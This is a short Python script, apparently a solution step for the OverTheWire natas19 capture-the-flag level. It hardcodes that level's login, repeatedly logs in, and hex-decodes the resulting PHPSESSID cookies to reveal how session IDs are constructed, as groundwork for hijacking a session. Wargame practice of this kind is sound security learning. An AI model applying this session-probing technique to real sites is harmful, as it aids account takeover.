import requests
import re

target = 'http://natas19.natas.labs.overthewire.org/index.php?debug=1'
user_auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

payload = {"username":"hello","password":"hello"}

for i in range(0,100):

    session = requests.Session()

    session.post(target, auth = user_auth, data = payload)
    response = session.get(target, auth = user_auth)
    #print response.cookies.get_dict()
    theCook = session.cookies['PHPSESSID']
    
    print("_" * (18-len(theCook))),
    print(theCook),
    print("   " + theCook.decode("hex"))

#print response.text
